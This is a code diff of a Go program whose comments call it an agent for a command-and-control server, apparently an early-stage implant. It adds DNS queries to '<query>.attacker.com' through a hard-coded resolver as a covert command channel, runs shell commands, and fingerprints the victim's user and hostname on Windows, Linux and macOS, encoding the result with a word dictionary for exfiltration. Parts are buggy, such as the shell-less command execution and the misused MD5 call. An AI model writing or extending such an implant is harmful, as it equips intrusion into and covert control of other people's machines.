@@ -1,11 +1,14 @@
 package main
 
 import (
+	"bufio"
 	"context"
+	"crypto/md5"
 	"fmt"
 	"net"
 	"os"
 	"os/exec"
+	"runtime"
 	"strconv"
 	"strings"
 	"syscall"
@@ -18,9 +21,50 @@ var (
 	serverPort = 5353
 )
 
-func mnemonicencode(str string) {
-	corpus := "hello,world,this,is,a,test,unique,list,of,words"
-	fmt.Println(corpus)
+func getdict() map[string]string {
+	// Get the dictionary
+	corp := ""
+	// Read from corpus.txt
+	file, err := os.Open("corpus.txt")
+	if err != nil {
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		corp += scanner.Text() + ","
+	}
+
+	corpus := strings.Split(corp, ",")
+	letters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+/="
+	inc := 0
+	dict := map[string]string{}
+
+	// for all combinations of letters set a corpus word for all of them
+	for _, i := range letters {
+		for _, j := range letters {
+			for _, k := range letters {
+				dict[string(i)+string(j)+string(k)] = corpus[inc]
+				inc++
+			}
+		}
+	}
+	return dict
+}
+
+func mnemonicencode(dict map[string]string, str string) string {
+	fmt.Println(str)
+	out := ""
+
+	for i := 0; i < len(str); i += 3 {
+		if i == len(str)-4 {
+			out += dict[string(str[i])+"   "]
+		} else {
+			out += dict[string(str[i])+string(str[i+1])+string(str[i+2])]
+		}
+	}
+
+	return out
 }
 
 func ipdecode(ips []string) string {
@@ -34,7 +78,15 @@ func ipdecode(ips []string) string {
 		chars[i] = string(func(a int, _ error) int { return a }(strconv.Atoi(ascii)))
 	}
 	// Join the chars
-	return strings.Join(chars, "")
+	out := strings.Join(chars, "")
+
+	// Strip the spaces from the end
+	return strings.TrimSpace(out)
+}
+
+func queryencode(dict map[string]string, str string) {
+	// Encode the query
+	mnemonicencode(dict, str)
 }
 
 func dnsquery(query string) string {
@@ -46,13 +98,13 @@ func dnsquery(query string) string {
 			return d.DialContext(ctx, network, fmt.Sprintf("%s:%d", serverIP, serverPort))
 		},
 	}
-	ip, _ := r.LookupHost(context.Background(), "john.attacker.com")
+	ip, _ := r.LookupHost(context.Background(), fmt.Sprintf("%s.attacker.com", query))
 	return ipdecode(ip)
 }
 
 func execute(cmd string) string {
 	// Execute a shell command
-	out, _ := exec.Command("/bin/sh", "-c", cmd).Output()
+	out, _ := exec.Command(cmd).CombinedOutput()
 
 	return string(out)
 }
@@ -64,19 +116,33 @@ func kill() {
 	syscall.Kill(pid, 9)
 }
 
-func ping() {
+func ping(dict map[string]string) {
 	// Send the ping to the C2 server
 	response := dnsquery("ping")
-
 	if response == "fingerprint" {
-		// If the response is fingerprint, execute the command
-		execute("fingerprint")
+		// Fingerprint machine and send back to c2 server
+		switch runtime.GOOS {
+		case "windows":
+			md5sum := md5.New().Sum([]byte(execute("powershell.exe -c \"whoami\"")))
+			fmt.Println(mnemonicencode(dict, fmt.Sprintf("%x\n", md5sum)))
+
+		case "linux":
+			md5sum := md5.New().Sum([]byte(execute("echo $(whoami)$(hostname)")))
+			fmt.Println(mnemonicencode(dict, fmt.Sprintf("%x\n", md5sum)))
+
+		case "darwin":
+			md5sum := md5.New().Sum([]byte(execute("echo $(whoami)$(hostname)")))
+			fmt.Println(mnemonicencode(dict, fmt.Sprintf("%x\n", md5sum)))
+
+		}
 	} else {
 		kill()
 	}
 }
 
 func main() {
+	// Get the dictionary
+	dict := getdict()
 	// Agent for the C2 server
-	ping()
+	ping(dict)
 }
